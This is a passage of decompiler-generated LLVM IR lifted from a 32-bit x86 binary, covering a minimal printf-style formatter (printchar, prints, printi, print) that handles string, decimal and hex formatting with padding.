  %stack_var_-12.0.lcssa = phi i32 [ %v1_80482e1, %dec_label_pc_8048307.preheader ], [ %stack_var_-12.019, %dec_label_pc_804830f ], [ %v4_8048304, %dec_label_pc_8048304 ]
  br label %dec_label_pc_804834a

dec_label_pc_804832f:                             ; preds = %dec_label_pc_804834a
  %v6_804833f = add i32 %storemerge, %v4_80482c9
  %v1_8048342 = inttoptr i32 %v6_804833f to i8*
  %v2_8048342 = load i8, i8* %v1_8048342, align 1
  %v3_8048345 = inttoptr i32 %v6_804835a to i8*
  store i8 %v2_8048342, i8* %v3_8048345, align 1
  %v4_8048347 = add i32 %storemerge, 1
  br label %dec_label_pc_804834a

dec_label_pc_804834a:                             ; preds = %dec_label_pc_8048327, %dec_label_pc_804832f
  %storemerge = phi i32 [ %v4_8048347, %dec_label_pc_804832f ], [ %stack_var_-16.0, %dec_label_pc_8048327 ]
  %v7_8048350 = icmp sgt i32 %storemerge, %stack_var_-12.0.lcssa
  %v2_8048358 = sub i32 %storemerge, %stack_var_-16.0
  %v6_804835a = add i32 %v2_8048358, %v4_80482c9
  br i1 %v7_8048350, label %dec_label_pc_8048352, label %dec_label_pc_804832f

dec_label_pc_8048352:                             ; preds = %dec_label_pc_804834a
  %v22_804835a = inttoptr i32 %v6_804835a to i8*
  store i8 0, i8* %v22_804835a, align 1
  %v2_8048363 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048363, i32* @edi, align 4
  ret i32 %v6_804835a

; uselistorder directives
  uselistorder i32 %storemerge, { 2, 3, 0, 1 }
  uselistorder i32 %stack_var_-12.019, { 0, 2, 1 }
  uselistorder i32 %v1_80482e1, { 2, 1, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804834a, { 1, 0 }
  uselistorder label %dec_label_pc_8048327, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804830f, { 1, 0 }
  uselistorder label %dec_label_pc_80482ea, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_804836c = icmp eq i32* %arg1, null
  br i1 %v4_804836c, label %dec_label_pc_804838b, label %dec_label_pc_8048372

dec_label_pc_8048372:                             ; preds = %entry
  %tmp5 = ptrtoint i32* %arg1 to i32
  %v2_8048375 = load i32, i32* %arg1, align 4
  %v3_804837a = inttoptr i32 %v2_8048375 to i8*
  store i8 %tmp8, i8* %v3_804837a, align 1
  %v2_804837f = load i32, i32* %arg1, align 4
  %v1_8048381 = add i32 %v2_804837f, 1
  store i32 %v1_8048381, i32* @edx, align 4
  store i32 %v1_8048381, i32* %arg1, align 4
  br label %dec_label_pc_80483a6

dec_label_pc_804838b:                             ; preds = %entry
  %v3_80483a1 = bitcast i8* %stack_var_8 to i32*
  %v4_80483a1 = call i32 @__libc_write(i32 1, i32* %v3_80483a1, i32 1)
  br label %dec_label_pc_80483a6

dec_label_pc_80483a6:                             ; preds = %dec_label_pc_8048372, %dec_label_pc_804838b
  %v0_80483a7 = phi i32 [ %tmp5, %dec_label_pc_8048372 ], [ %v4_80483a1, %dec_label_pc_804838b ]
  ret i32 %v0_80483a7

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_80483a6, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp13 = icmp slt i32 %arg3, 1
  br i1 %tmp13, label %dec_label_pc_8048409, label %dec_label_pc_80483c2

dec_label_pc_80483c2:                             ; preds = %entry
  %v4_80483c9 = ptrtoint i8* %arg2 to i32
  store i32 %v4_80483c9, i32* @edx, align 4
  %v2_80483da45 = load i8, i8* %arg2, align 1
  %v4_80483dd47 = icmp eq i8 %v2_80483da45, 0
  %v1_80483df49 = icmp eq i1 %v4_80483dd47, false
  br i1 %v1_80483df49, label %dec_label_pc_80483d1, label %dec_label_pc_80483e1

dec_label_pc_80483d1:                             ; preds = %dec_label_pc_80483c2, %dec_label_pc_80483d1
  %v4_80483d751 = phi i32 [ %v5_80483d4, %dec_label_pc_80483d1 ], [ %v4_80483c9, %dec_label_pc_80483c2 ]
  %stack_var_-12.050 = phi i32 [ %v4_80483d1, %dec_label_pc_80483d1 ], [ 0, %dec_label_pc_80483c2 ]
  %v4_80483d1 = add i32 %stack_var_-12.050, 1
  %v5_80483d4 = add i32 %v4_80483d751, 1
  %v22_80483d4 = inttoptr i32 %v5_80483d4 to i8*
  store i32 %v5_80483d4, i32* @edx, align 4
  %v2_80483da = load i8, i8* %v22_80483d4, align 1
  %v4_80483dd = icmp eq i8 %v2_80483da, 0
  %v1_80483df = icmp eq i1 %v4_80483dd, false
  br i1 %v1_80483df, label %dec_label_pc_80483d1, label %dec_label_pc_80483e1

dec_label_pc_80483e1:                             ; preds = %dec_label_pc_80483d1, %dec_label_pc_80483c2
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_80483c2 ], [ %v4_80483d1, %dec_label_pc_80483d1 ]
  %v5_80483e7 = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_80483e7, label %dec_label_pc_80483f2, label %dec_label_pc_80483f8

dec_label_pc_80483f2:                             ; preds = %dec_label_pc_80483e1
  store i32 %stack_var_-12.0.lcssa, i32* @edx, align 4
  %v5_80483f5 = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_80483f8

dec_label_pc_80483f8:                             ; preds = %dec_label_pc_80483e1, %dec_label_pc_80483f2
  %storemerge = phi i32 [ %v5_80483f5, %dec_label_pc_80483f2 ], [ 0, %dec_label_pc_80483e1 ]
  %v1_80483fb = and i32 %arg4, 2
  %tmp14 = mul nuw nsw i32 %v1_80483fb, 8
  %tmp15 = or i32 %tmp14, 32
  br label %dec_label_pc_8048409

dec_label_pc_8048409:                             ; preds = %dec_label_pc_80483f8, %entry
  %stack_var_12.0 = phi i32 [ %arg3, %entry ], [ %storemerge, %dec_label_pc_80483f8 ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ %tmp15, %dec_label_pc_80483f8 ]
  %v1_804840c = urem i32 %arg4, 2
  %v2_804840c = icmp eq i32 %v1_804840c, 0
  %v1_8048411 = icmp eq i1 %v2_804840c, false
  %.pre = inttoptr i32 %arg1 to i32*
  br i1 %v1_8048411, label %dec_label_pc_8048453.preheader, label %dec_label_pc_804842d.preheader

dec_label_pc_804842d.preheader:                   ; preds = %dec_label_pc_8048409
  %tmp1638 = icmp slt i32 %stack_var_12.0, 1
  %tmp1739 = icmp eq i1 %tmp1638, false
  br i1 %tmp1739, label %dec_label_pc_8048415, label %dec_label_pc_8048453.preheader

dec_label_pc_8048415:                             ; preds = %dec_label_pc_804842d.preheader, %dec_label_pc_8048415
  %stack_var_-20.041 = phi i32 [ %v4_8048427, %dec_label_pc_8048415 ], [ 0, %dec_label_pc_804842d.preheader ]
  %stack_var_12.140 = phi i32 [ %v4_804842a, %dec_label_pc_8048415 ], [ %stack_var_12.0, %dec_label_pc_804842d.preheader ]
  %v3_8048422 = call i32 @printchar(i32* %.pre, i32 %stack_var_-16.0)
  %v4_8048427 = add i32 %stack_var_-20.041, 1
  %v4_804842a = add i32 %stack_var_12.140, -1
  %tmp16 = icmp slt i32 %v4_804842a, 1
  %tmp17 = icmp eq i1 %tmp16, false
  br i1 %tmp17, label %dec_label_pc_8048415, label %dec_label_pc_8048453.preheader

dec_label_pc_8048453.preheader:                   ; preds = %dec_label_pc_804842d.preheader, %dec_label_pc_8048415, %dec_label_pc_8048409
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_8048409 ], [ %stack_var_12.0, %dec_label_pc_804842d.preheader ], [ %v4_804842a, %dec_label_pc_8048415 ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_8048409 ], [ 0, %dec_label_pc_804842d.preheader ], [ %v4_8048427, %dec_label_pc_8048415 ]
  %v4_804845326 = ptrtoint i8* %arg2 to i32
  %v2_804845627 = load i8, i8* %arg2, align 1
  %v4_804845929 = icmp eq i8 %v2_804845627, 0
  %v1_804845b31 = icmp eq i1 %v4_804845929, false
  br i1 %v1_804845b31, label %dec_label_pc_8048435, label %dec_label_pc_8048477.preheader

dec_label_pc_8048435:                             ; preds = %dec_label_pc_8048453.preheader, %dec_label_pc_8048435
  %v4_804845334 = phi i32 [ %v5_8048450, %dec_label_pc_8048435 ], [ %v4_804845326, %dec_label_pc_8048453.preheader ]
  %stack_var_-20.133 = phi i32 [ %v4_804844d, %dec_label_pc_8048435 ], [ %stack_var_-20.1.ph, %dec_label_pc_8048453.preheader ]
  %stack_var_8.032 = phi i8* [ %v22_8048450, %dec_label_pc_8048435 ], [ %arg2, %dec_label_pc_8048453.preheader ]
  %v2_8048438 = load i8, i8* %stack_var_8.032, align 1
  %v3_8048438 = zext i8 %v2_8048438 to i32
  %v3_8048448 = call i32 @printchar(i32* %.pre, i32 %v3_8048438)
  %v4_804844d = add i32 %stack_var_-20.133, 1
  %v5_8048450 = add i32 %v4_804845334, 1
  %v22_8048450 = inttoptr i32 %v5_8048450 to i8*
  %v2_8048456 = load i8, i8* %v22_8048450, align 1
  %v4_8048459 = icmp eq i8 %v2_8048456, 0
  %v1_804845b = icmp eq i1 %v4_8048459, false
  br i1 %v1_804845b, label %dec_label_pc_8048435, label %dec_label_pc_8048477.preheader

dec_label_pc_8048477.preheader:                   ; preds = %dec_label_pc_8048435, %dec_label_pc_8048453.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_8048453.preheader ], [ %v4_804844d, %dec_label_pc_8048435 ]
  %tmp1822 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp1923 = icmp eq i1 %tmp1822, false
  br i1 %tmp1923, label %dec_label_pc_804845f, label %dec_label_pc_804847d

dec_label_pc_804845f:                             ; preds = %dec_label_pc_8048477.preheader, %dec_label_pc_804845f
  %stack_var_-20.225 = phi i32 [ %v4_8048471, %dec_label_pc_804845f ], [ %stack_var_-20.1.lcssa, %dec_label_pc_8048477.preheader ]
  %stack_var_12.324 = phi i32 [ %v4_8048474, %dec_label_pc_804845f ], [ %stack_var_12.2.ph, %dec_label_pc_8048477.preheader ]
  %v3_804846c = call i32 @printchar(i32* %.pre, i32 %stack_var_-16.0)
  %v4_8048471 = add i32 %stack_var_-20.225, 1
  %v4_8048474 = add i32 %stack_var_12.324, -1
  %tmp18 = icmp slt i32 %v4_8048474, 1
  %tmp19 = icmp eq i1 %tmp18, false
  br i1 %tmp19, label %dec_label_pc_804845f, label %dec_label_pc_804847d

dec_label_pc_804847d:                             ; preds = %dec_label_pc_804845f, %dec_label_pc_8048477.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_8048477.preheader ], [ %v4_8048471, %dec_label_pc_804845f ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v4_8048474, { 1, 0 }
  uselistorder i8* %v22_8048450, { 1, 0 }
  uselistorder i32 %v5_8048450, { 1, 0 }
  uselistorder i32 %v4_804842a, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 2, 0 }
  uselistorder i32 %v5_80483d4, { 1, 2, 0 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %dec_label_pc_804845f, { 1, 0 }
  uselistorder label %dec_label_pc_8048435, { 1, 0 }
  uselistorder label %dec_label_pc_8048453.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048415, { 1, 0 }
  uselistorder label %dec_label_pc_80483f8, { 1, 0 }
  uselistorder label %dec_label_pc_80483d1, { 1, 0 }
}

define i32 @printi(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v4_8048496 = trunc i64 %arg2 to i32
  %v5_804849c = icmp eq i32 %v4_8048496, 0
  %v6_804849c = icmp slt i32 %v4_8048496, 0
  %v1_80484a0 = icmp eq i1 %v5_804849c, false
  br i1 %v1_80484a0, label %dec_label_pc_80484d2, label %dec_label_pc_80484a2

dec_label_pc_80484a2:                             ; preds = %entry
  store i32 48, i32* %stack_var_-16, align 4
  %tmp41 = bitcast i32* %stack_var_-16 to i8*
  %v6_80484c5 = call i32 @prints(i32 %arg1, i8* %tmp41, i32 %arg5, i32 %arg6)
  br label %dec_label_pc_80485bc

dec_label_pc_80484d2:                             ; preds = %entry
  %v4_80484d2 = icmp eq i32 %arg4, 0
  br i1 %v4_80484d2, label %dec_label_pc_80484f3, label %dec_label_pc_80484d8

dec_label_pc_80484d8:                             ; preds = %dec_label_pc_80484d2
  %v13_80484d8 = icmp eq i32 %arg3, 10
  %v1_80484dc = icmp eq i1 %v13_80484d8, false
  br i1 %v1_80484dc, label %dec_label_pc_80484f3, label %dec_label_pc_80484de

dec_label_pc_80484de:                             ; preds = %dec_label_pc_80484d8
  %v1_80484e2 = icmp eq i1 %v6_804849c, false
  br i1 %v1_80484e2, label %dec_label_pc_80484f3, label %dec_label_pc_80484e4

dec_label_pc_80484e4:                             ; preds = %dec_label_pc_80484de
  %v1_80484ee = sub i32 0, %v4_8048496
  %v5_80484f0 = sext i32 %v1_80484ee to i64
  br label %dec_label_pc_80484f3

dec_label_pc_80484f3:                             ; preds = %dec_label_pc_80484de, %dec_label_pc_80484d8, %dec_label_pc_80484d2, %dec_label_pc_80484e4
  %stack_var_-24.0 = phi i64 [ %arg2, %dec_label_pc_80484d2 ], [ %arg2, %dec_label_pc_80484d8 ], [ %arg2, %dec_label_pc_80484de ], [ %v5_80484f0, %dec_label_pc_80484e4 ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_80484d2 ], [ 0, %dec_label_pc_80484d8 ], [ 0, %dec_label_pc_80484de ], [ 1, %dec_label_pc_80484e4 ]
  %tmp42 = bitcast i32* %stack_var_-5 to i8*
  store i8 0, i8* %tmp42, align 4
  %v4_80485547 = trunc i64 %stack_var_-24.0 to i32
  %v5_80485548 = icmp eq i32 %v4_80485547, 0
  %v1_804855815 = icmp eq i1 %v5_80485548, false
  br i1 %v1_804855815, label %dec_label_pc_8048504.lr.ph, label %dec_label_pc_804855a

dec_label_pc_8048504.lr.ph:                       ; preds = %dec_label_pc_80484f3
  %v5_8048507 = sext i32 %arg3 to i64
  br label %dec_label_pc_8048504

dec_label_pc_8048504:                             ; preds = %dec_label_pc_8048504.lr.ph, %dec_label_pc_804852c
  %stack_var_-24.117 = phi i64 [ %stack_var_-24.0, %dec_label_pc_8048504.lr.ph ], [ %v5_8048551, %dec_label_pc_804852c ]
  %stack_var_-40.016 = phi i8* [ %tmp42, %dec_label_pc_8048504.lr.ph ], [ %v22_804852c, %dec_label_pc_804852c ]
  %v6_8048512 = and i64 %stack_var_-24.117, 4294967295
  %v12_8048512 = udiv i64 %v6_8048512, %v5_8048507
  %v13_8048512 = trunc i64 %v12_8048512 to i32
  %v14_8048512 = urem i64 %v6_8048512, %v5_8048507
  %v5_8048517 = trunc i64 %v14_8048512 to i8
  %v7_804851e = icmp sgt i8 %v5_8048517, 9
  br i1 %v7_804851e, label %dec_label_pc_8048520, label %dec_label_pc_804852c

dec_label_pc_8048520:                             ; preds = %dec_label_pc_8048504
  %tmp = trunc i64 %v14_8048512 to i32
  %v5_8048523 = add i32 %tmp, %arg7
  %v1_8048526 = add i32 %v5_8048523, 198
  %v11_8048526 = trunc i32 %v1_8048526 to i8
  br label %dec_label_pc_804852c

dec_label_pc_804852c:                             ; preds = %dec_label_pc_8048504, %dec_label_pc_8048520
  %stack_var_-36.0 = phi i8 [ %v11_8048526, %dec_label_pc_8048520 ], [ %v5_8048517, %dec_label_pc_8048504 ]
  %v4_804852c = ptrtoint i8* %stack_var_-40.016 to i32
  %v5_804852c = add i32 %v4_804852c, -1
  %v22_804852c = inttoptr i32 %v5_804852c to i8*
  %v2_8048533 = add i8 %stack_var_-36.0, 48
  store i8 %v2_8048533, i8* %v22_804852c, align 1
  %v5_8048551 = sext i32 %v13_8048512 to i64
  %v5_8048554 = icmp eq i32 %v13_8048512, 0
  %v1_8048558 = icmp eq i1 %v5_8048554, false
  br i1 %v1_8048558, label %dec_label_pc_8048504, label %dec_label_pc_804855a

dec_label_pc_804855a:                             ; preds = %dec_label_pc_804852c, %dec_label_pc_80484f3
  %stack_var_-40.0.lcssa = phi i8* [ %tmp42, %dec_label_pc_80484f3 ], [ %v22_804852c, %dec_label_pc_804852c ]
  %v4_804855a = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_804855a, label %dec_label_pc_8048594, label %dec_label_pc_8048560

dec_label_pc_8048560:                             ; preds = %dec_label_pc_804855a
  %v4_8048560 = icmp eq i32 %arg5, 0
  br i1 %v4_8048560, label %dec_label_pc_804858b, label %dec_label_pc_8048566

dec_label_pc_8048566:                             ; preds = %dec_label_pc_8048560
  %v1_8048569 = and i32 %arg6, 2
  %v2_8048569 = icmp eq i32 %v1_8048569, 0
  br i1 %v2_8048569, label %dec_label_pc_804858b, label %dec_label_pc_8048570

dec_label_pc_8048570:                             ; preds = %dec_label_pc_8048566
  %v3_804857e = inttoptr i32 %arg1 to i32*
  %v4_804857e = call i32 @printchar(i32* %v3_804857e, i32 45)
  %v4_8048586 = add i32 %arg5, -1
  br label %dec_label_pc_8048594

dec_label_pc_804858b:                             ; preds = %dec_label_pc_8048566, %dec_label_pc_8048560
  %v4_804858b = ptrtoint i8* %stack_var_-40.0.lcssa to i32
  %v5_804858b = add i32 %v4_804858b, -1
  %v22_804858b = inttoptr i32 %v5_804858b to i8*
  store i8 45, i8* %v22_804858b, align 1
  br label %dec_label_pc_8048594

dec_label_pc_8048594:                             ; preds = %dec_label_pc_804855a, %dec_label_pc_8048570, %dec_label_pc_804858b
  %stack_var_20.0 = phi i32 [ %arg5, %dec_label_pc_804855a ], [ %arg5, %dec_label_pc_804858b ], [ %v4_8048586, %dec_label_pc_8048570 ]
  %stack_var_-40.1 = phi i8* [ %stack_var_-40.0.lcssa, %dec_label_pc_804855a ], [ %v22_804858b, %dec_label_pc_804858b ], [ %stack_var_-40.0.lcssa, %dec_label_pc_8048570 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_804855a ], [ 0, %dec_label_pc_804858b ], [ 1, %dec_label_pc_8048570 ]
  %v6_80485af = call i32 @prints(i32 %arg1, i8* %stack_var_-40.1, i32 %stack_var_20.0, i32 %arg6)
  %v2_80485b7 = add i32 %v6_80485af, %stack_var_-28.0
  store i32 %v2_80485b7, i32* @edx, align 4
  br label %dec_label_pc_80485bc

dec_label_pc_80485bc:                             ; preds = %dec_label_pc_80484a2, %dec_label_pc_8048594
  %storemerge = phi i32 [ %v2_80485b7, %dec_label_pc_8048594 ], [ %v6_80484c5, %dec_label_pc_80484a2 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-40.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v22_804852c, { 0, 2, 1 }
  uselistorder i8 %v5_8048517, { 1, 0 }
  uselistorder i64 %v6_8048512, { 1, 0 }
  uselistorder i32 %arg6, { 1, 2, 0 }
  uselistorder i32 %arg5, { 2, 4, 1, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i64 %arg2, { 2, 1, 0, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80485bc, { 1, 0 }
  uselistorder label %dec_label_pc_8048594, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804852c, { 1, 0 }
  uselistorder label %dec_label_pc_8048504, { 1, 0 }
  uselistorder label %dec_label_pc_80484f3, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp6 = ptrtoint i32* %arg1 to i32
  %stack_var_-6 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80485c1 = load i32, i32* @ebp, align 4
  store i32 %v0_80485c1, i32* %stack_var_-4, align 4
  %tmp21 = bitcast i32* %stack_var_-6 to i8*
  %stack_var_8.435 = inttoptr i32 %arg2 to i8*
  %v2_804887536 = load i8, i8* %stack_var_8.435, align 1
  %v4_804887838 = icmp eq i8 %v2_804887536, 0
  %v1_804887a40 = icmp eq i1 %v4_804887838, false
  br i1 %v1_804887a40, label %dec_label_pc_80485d3, label %dec_label_pc_8048880

dec_label_pc_80485d3:                             ; preds = %entry, %dec_label_pc_804886f
  %stack_var_8.444 = phi i8* [ %stack_var_8.4, %dec_label_pc_804886f ], [ %stack_var_8.435, %entry ]
  %stack_var_-28.143 = phi i32 [ %stack_var_-28.0, %dec_label_pc_804886f ], [ 0, %entry ]
  %stack_var_12.142 = phi i32 [ %stack_var_12.0, %dec_label_pc_804886f ], [ %arg3, %entry ]
  %stack_var_8.4.in41 = phi i32 [ %v5_804886f, %dec_label_pc_804886f ], [ %arg2, %entry ]
  %v2_80485d6 = load i8, i8* %stack_var_8.444, align 1
  %v10_80485d9 = icmp eq i8 %v2_80485d6, 37
  %v1_80485db = icmp eq i1 %v10_80485d9, false
  br i1 %v1_80485db, label %dec_label_pc_8048854, label %dec_label_pc_80485e1

dec_label_pc_80485e1:                             ; preds = %dec_label_pc_80485d3
  %v5_80485e1 = add i32 %stack_var_8.4.in41, 1
  %v22_80485e1 = inttoptr i32 %v5_80485e1 to i8*
  %v2_80485f4 = load i8, i8* %v22_80485e1, align 1
  %v4_80485f7 = icmp eq i8 %v2_80485f4, 0
  br i1 %v4_80485f7, label %dec_label_pc_8048880, label %dec_label_pc_80485ff

dec_label_pc_80485ff:                             ; preds = %dec_label_pc_80485e1
  %v2_8048602 = load i8, i8* %v22_80485e1, align 1
  %v10_8048605 = icmp eq i8 %v2_8048602, 37
  br i1 %v10_8048605, label %dec_label_pc_8048854, label %dec_label_pc_804860d

dec_label_pc_804860d:                             ; preds = %dec_label_pc_80485ff
  %v2_8048610 = load i8, i8* %v22_80485e1, align 1
  %v10_8048613 = icmp eq i8 %v2_8048610, 45
  %v1_8048615 = icmp eq i1 %v10_8048613, false
  br i1 %v1_8048615, label %dec_label_pc_804862a.preheader, label %dec_label_pc_8048617

dec_label_pc_8048617:                             ; preds = %dec_label_pc_804860d
  %v5_8048617 = add i32 %stack_var_8.4.in41, 2
  %v22_8048617 = inttoptr i32 %v5_8048617 to i8*
  br label %dec_label_pc_804862a.preheader

dec_label_pc_804862a.preheader:                   ; preds = %dec_label_pc_8048617, %dec_label_pc_804860d
  %stack_var_8.0.ph = phi i8* [ %v22_80485e1, %dec_label_pc_804860d ], [ %v22_8048617, %dec_label_pc_8048617 ]
  %stack_var_-32.0.ph = phi i32 [ 0, %dec_label_pc_804860d ], [ 1, %dec_label_pc_8048617 ]
  %v4_804862a22 = ptrtoint i8* %stack_var_8.0.ph to i32
  %v2_804862d23 = load i8, i8* %stack_var_8.0.ph, align 1
  %v7_804863030 = icmp eq i8 %v2_804862d23, 48
  br i1 %v7_804863030, label %dec_label_pc_8048623, label %dec_label_pc_8048659.preheader

dec_label_pc_8048623:                             ; preds = %dec_label_pc_804862a.preheader, %dec_label_pc_8048623
  %v4_804862a33 = phi i32 [ %v5_8048623, %dec_label_pc_8048623 ], [ %v4_804862a22, %dec_label_pc_804862a.preheader ]
  %stack_var_-32.032 = phi i32 [ %v4_8048626, %dec_label_pc_8048623 ], [ %stack_var_-32.0.ph, %dec_label_pc_804862a.preheader ]
  %v5_8048623 = add i32 %v4_804862a33, 1
  %v22_8048623 = inttoptr i32 %v5_8048623 to i8*
  %v4_8048626 = or i32 %stack_var_-32.032, 2
  %v2_804862d = load i8, i8* %v22_8048623, align 1
  %v7_8048630 = icmp eq i8 %v2_804862d, 48
  br i1 %v7_8048630, label %dec_label_pc_8048623, label %dec_label_pc_8048659.preheader

dec_label_pc_8048659.preheader:                   ; preds = %dec_label_pc_8048623, %dec_label_pc_804862a.preheader
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_804862a.preheader ], [ %v22_8048623, %dec_label_pc_8048623 ]
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_804862a.preheader ], [ %v4_8048626, %dec_label_pc_8048623 ]
  br label %dec_label_pc_8048659

dec_label_pc_8048636:                             ; preds = %dec_label_pc_8048663
  %v2_804863f = mul i32 %stack_var_-36.0, 10
  %v2_8048647 = load i8, i8* %stack_var_8.1, align 1
  %v3_8048647 = zext i8 %v2_8048647 to i32
  %v5_804864d = add i32 %v3_8048647, %v2_804863f
  %v1_8048650 = add i32 %v5_804864d, -48
  %v5_8048656 = add i32 %v4_8048659, 1
  %v22_8048656 = inttoptr i32 %v5_8048656 to i8*
  br label %dec_label_pc_8048659

dec_label_pc_8048659:                             ; preds = %dec_label_pc_8048659.preheader, %dec_label_pc_8048636
  %stack_var_8.1 = phi i8* [ %v22_8048656, %dec_label_pc_8048636 ], [ %stack_var_8.0.lcssa, %dec_label_pc_8048659.preheader ]
  %stack_var_-36.0 = phi i32 [ %v1_8048650, %dec_label_pc_8048636 ], [ 0, %dec_label_pc_8048659.preheader ]
  %v4_8048659 = ptrtoint i8* %stack_var_8.1 to i32
  %v2_804865c = load i8, i8* %stack_var_8.1, align 1
  %tmp = icmp ult i8 %v2_804865c, 48
  br i1 %tmp, label %dec_label_pc_804866d, label %dec_label_pc_8048663

dec_label_pc_8048663:                             ; preds = %dec_label_pc_8048659
  %v2_8048666 = load i8, i8* %stack_var_8.1, align 1
  %tmp48 = icmp ult i8 %v2_8048666, 58
  br i1 %tmp48, label %dec_label_pc_8048636, label %dec_label_pc_804866d

dec_label_pc_804866d:                             ; preds = %dec_label_pc_8048663, %dec_label_pc_8048659
  %v2_8048670 = load i8, i8* %stack_var_8.1, align 1
  %v10_8048673 = icmp eq i8 %v2_8048670, 115
  %v1_8048675 = icmp eq i1 %v10_8048673, false
  br i1 %v1_8048675, label %dec_label_pc_80486c4, label %dec_label_pc_8048677

dec_label_pc_8048677:                             ; preds = %dec_label_pc_804866d
  %v1_804867a = add i32 %stack_var_12.142, 4
  %v1_8048682 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_8048682 = load i32, i32* %v1_8048682, align 4
  %v4_8048687 = icmp eq i32 %v2_8048682, 0
  br i1 %v4_8048687, label %dec_label_pc_804869c, label %dec_label_pc_804868d

dec_label_pc_804868d:                             ; preds = %dec_label_pc_8048677
  %v5_8048690 = inttoptr i32 %v2_8048682 to i8*
  br label %dec_label_pc_804869c

dec_label_pc_804869c:                             ; preds = %dec_label_pc_8048677, %dec_label_pc_804868d
  %storemerge = phi i8* [ %v5_8048690, %dec_label_pc_804868d ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8058e52.12, i32 0, i32 0), %dec_label_pc_8048677 ]
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v6_80486b7 = call i32 @prints(i32 %tmp6, i8* %storemerge, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa)
  %v5_80486bc = add i32 %v6_80486b7, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_80486c4:                             ; preds = %dec_label_pc_804866d
  %v2_80486c7 = load i8, i8* %stack_var_8.1, align 1
  %v10_80486ca = icmp eq i8 %v2_80486c7, 100
  %v1_80486cc = icmp eq i1 %v10_80486ca, false
  br i1 %v1_80486cc, label %dec_label_pc_8048718, label %dec_label_pc_80486ce

dec_label_pc_80486ce:                             ; preds = %dec_label_pc_80486c4
  %v1_80486d1 = add i32 %stack_var_12.142, 4
  %v1_80486d9 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_80486d9 = load i32, i32* %v1_80486d9, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_804870b = sext i32 %v2_80486d9 to i64
  %v9_804870b = call i32 @printi(i32 %tmp6, i64 %v8_804870b, i32 10, i32 1, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_8048710 = add i32 %v9_804870b, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_8048718:                             ; preds = %dec_label_pc_80486c4
  %v2_804871b = load i8, i8* %stack_var_8.1, align 1
  %v10_804871e = icmp eq i8 %v2_804871b, 120
  %v1_8048720 = icmp eq i1 %v10_804871e, false
  br i1 %v1_8048720, label %dec_label_pc_804876c, label %dec_label_pc_8048722

dec_label_pc_8048722:                             ; preds = %dec_label_pc_8048718
  %v1_8048725 = add i32 %stack_var_12.142, 4
  %v1_804872d = inttoptr i32 %stack_var_12.142 to i32*
  %v2_804872d = load i32, i32* %v1_804872d, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_804875f = sext i32 %v2_804872d to i64
  %v9_804875f = call i32 @printi(i32 %tmp6, i64 %v8_804875f, i32 16, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_8048764 = add i32 %v9_804875f, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_804876c:                             ; preds = %dec_label_pc_8048718
  %v2_804876f = load i8, i8* %stack_var_8.1, align 1
  %v10_8048772 = icmp eq i8 %v2_804876f, 88
  %v1_8048774 = icmp eq i1 %v10_8048772, false
